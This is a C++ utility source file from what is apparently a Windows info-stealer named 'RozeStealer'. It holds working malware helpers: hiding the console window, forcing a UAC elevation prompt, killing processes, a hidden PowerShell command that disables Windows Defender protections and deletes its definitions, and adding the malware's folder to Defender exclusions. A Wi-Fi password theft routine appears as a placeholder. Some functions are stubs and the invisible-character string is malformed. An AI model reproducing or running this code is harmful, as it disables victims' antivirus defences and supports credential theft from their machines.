#include "Utility.h"
#include "../Core/Settings.h"
#include <iostream>
#include <random>
#include <algorithm>
#include <cctype>
#include <vector>
#include <string>
#include <fstream>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <wlanapi.h>
#include <wtsapi32.h>
#include <lm.h>
#include <shlobj.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <atlbase.h>
#include <windows.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Wlanapi.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "crypt32.lib")
#endif

namespace RozeStealer {

void Utility::toggleConsole(bool show) {
#ifdef _WIN32
    HWND consoleWindow = GetConsoleWindow();
    if (consoleWindow) {
        ShowWindow(consoleWindow, show ? SW_SHOW : SW_HIDE);
    }
#else
    // Non-Windows implementation (placeholder)
    std::cout << "Toggle console: " << (show ? "show" : "hide") << std::endl;
#endif
}

bool Utility::isAdmin() {
#ifdef _WIN32
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(
        &ntAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &administratorsGroup)) {

        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }

        FreeSid(administratorsGroup);
    }
    return isAdmin == TRUE;
#else
    // Non-Windows implementation (placeholder)
    return geteuid() == 0;
#endif
}

std::string Utility::getSelfDir() {
#ifdef _WIN32
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    std::string::size_type pos = std::string(buffer).find_last_of("\\/");
    return std::string(buffer).substr(0, pos);
#else
    // Non-Windows implementation (placeholder)
    return ".";
#endif
}

bool Utility::checkInternetConnection() {
#ifdef _WIN32
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        return false;
    }

    struct addrinfo *result = NULL, *ptr = NULL, hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo("www.google.com", "80", &hints, &result);
    if (iResult != 0) {
        WSACleanup();
        return false;
    }

    SOCKET connectSocket = INVALID_SOCKET;
    bool connected = false;
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (connectSocket == INVALID_SOCKET) {
            continue;
        }

        // Set a timeout for the connection attempt
        DWORD timeout = 3000; // 3 seconds
        setsockopt(connectSocket, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
        setsockopt(connectSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

        iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(connectSocket);
            connectSocket = INVALID_SOCKET;
            continue;
        }
        connected = true;
        break;
    }

    freeaddrinfo(result);

    if (connectSocket != INVALID_SOCKET) {
        closesocket(connectSocket);
    }
    WSACleanup();
    return connected;
#else
    // Non-Windows implementation (placeholder)
    return true;
#endif
}

std::string Utility::getRandomString(int length, bool invisible) {
    std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    if (invisible) {
        // Unicode invisible characters (a0, 8239, 8192-8207)
        // Note: This is a simplified representation. Actual invisible chars might be more complex.
        chars = "\xA0\x200B\x200C\x200D\x200E\x200F"; // Example: No-break space, Zero Width Space, etc.
    }

    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> distribution(0, chars.length() - 1);

    std::string randomString;
    for (int i = 0; i < length; ++i) {
        randomString += chars[distribution(generator)];
    }
    return randomString;
}

void Utility::checkConfiguration() {
    Settings currentSettings;
    std::string configFile = Utility::getSelfDir() + "/config.json";

    if (std::ifstream(configFile).good()) {
        currentSettings.loadConfig(configFile);
    } else {
        // Simulate user input for updatesCheck and password
        // In a real GUI application, this would be handled by dialogs
        currentSettings.updatesCheck = true; // Default to true
        currentSettings.password = "blank123"; // Default password
    }
    currentSettings.saveConfig(configFile);
}

void Utility::taskKill(const std::vector<std::string>& tasks) {
#ifdef _WIN32
    for (const std::string& task : tasks) {
        std::string command = "taskkill /F /IM " + task + ".exe";
        // Using system() for simplicity, in a real application, prefer CreateProcess or ShellExecuteEx
        system(command.c_str());
    }
#else
    // Non-Windows implementation (placeholder)
    for (const std::string& task : tasks) {
        std::cout << "Would kill task: " << task << std::endl;
    }
#endif
}

bool Utility::uacPrompt(const std::string& path) {
#ifdef _WIN32
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = path.c_str();
    sei.nShow = SW_SHOWNORMAL;
    return ShellExecuteExA(&sei);
#else
    // Non-Windows implementation (placeholder)
    std::cout << "Would UAC prompt for: " << path << std::endl;
    return true;
#endif
}

void Utility::disableDefender() {
#ifdef _WIN32
    // This is a simplified example. Disabling Defender is complex and requires administrative privileges.
    // In a real scenario, this would involve more robust methods and error handling.
    std::string command = "powershell -Command \"Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent Never; Set-MpPreference -SubmitSamplesConsent 2; \"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\"";
    ShellExecuteA(NULL, "open", "powershell.exe", command.c_str(), NULL, SW_HIDE);
#else
    // Non-Windows implementation (placeholder)
    std::cout << "Would disable defender" << std::endl;
#endif
}

void Utility::excludeFromDefender(const std::string& path) {
#ifdef _WIN32
    std::string targetPath = path.empty() ? Utility::getSelfDir() : path;
    std::string command = "powershell -Command \"Add-MpPreference -ExclusionPath ";
    command += "'" + targetPath + "'\"";
    ShellExecuteA(NULL, "open", "powershell.exe", command.c_str(), NULL, SW_HIDE);
#else
    // Non-Windows implementation (placeholder)
    std::cout << "Would exclude from defender: " << (path.empty() ? Utility::getSelfDir() : path) << std::endl;
#endif
}

std::map<std::string, std::string> Utility::getWifiPasswords() {
    std::map<std::string, std::string> wifiPasswords;
#ifdef _WIN32
    // This is a complex operation involving WlanAPI and parsing command line output.
    // A full implementation would be extensive. Here's a simplified placeholder.
    // Example: netsh wlan show profile name="ProfileName" key=clear
    // For a real implementation, consider using the Native Wifi API directly.
    wifiPasswords["ExampleWifi"] = "ExamplePassword";
#else
    // Non-Windows implementation (placeholder)
    wifiPasswords["ExampleWifi"] = "ExamplePassword";
#endif
    return wifiPasswords;
}

std::string Utility::getLnkTarget(const std::string& pathToLnk) {
#ifdef _WIN32
    // This is a complex operation involving COM interfaces (IShellLink, IPersistFile).
    // A full implementation would be extensive. Here's a simplified placeholder.
    // For a real implementation, refer to Windows Shell Programming documentation.
    return "";
#else
    // Non-Windows implementation (placeholder)
    return "";
#endif
}

bool Utility::checkForUpdates() {
    // In a real Windows environment, this would involve an HTTP client (e.g., WinHTTP or libcurl)
    // to fetch the hash from GitHub and compare it with a local hash.
    // For this simulation, we will always return false.
    return false;
}

std::string Utility::base64Encode(const std::string& data) {
#ifdef _WIN32
    DWORD dwFlags = CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF;
    DWORD dwEncodedLen = 0;

    // Determine the length of the encoded string
    if (!CryptBinaryToStringA(
        reinterpret_cast<const BYTE*>(data.c_str()),
        static_cast<DWORD>(data.length()),
        dwFlags,
        NULL,
        &dwEncodedLen
    )) {
        return ""; // Error
    }

    std::string encodedString(dwEncodedLen, '\0');
    if (!CryptBinaryToStringA(
        reinterpret_cast<const BYTE*>(data.c_str()),
        static_cast<DWORD>(data.length()),
        dwFlags,
        &encodedString[0],
        &dwEncodedLen
    )) {
        return ""; // Error
    }

    encodedString.resize(dwEncodedLen - 1); // Remove null terminator
    return encodedString;
#else
    // Non-Windows implementation (placeholder)
    // In a real implementation, use a cross-platform base64 library
    return data; // Placeholder
#endif
}

std::string Utility::base64Decode(const std::string& data) {
#ifdef _WIN32
    DWORD dwFlags = CRYPT_STRING_BASE64;
    DWORD dwDecodedLen = 0;

    // Determine the length of the decoded string
    if (!CryptStringToBinaryA(
        data.c_str(),
        static_cast<DWORD>(data.length()),
        dwFlags,
        NULL,
        &dwDecodedLen,
        NULL,
        NULL
    )) {
        return ""; // Error
    }

    std::string decodedString(dwDecodedLen, '\0');
    if (!CryptStringToBinaryA(
        data.c_str(),
        static_cast<DWORD>(data.length()),
        dwFlags,
        reinterpret_cast<BYTE*>(&decodedString[0]),
        &dwDecodedLen,
        NULL,
        NULL
    )) {
        return ""; // Error
    }

    decodedString.resize(dwDecodedLen); // Resize to actual decoded length
    return decodedString;
#else
    // Non-Windows implementation (placeholder)
    // In a real implementation, use a cross-platform base64 library
    return data; // Placeholder
#endif
}

} // namespace RozeStealer

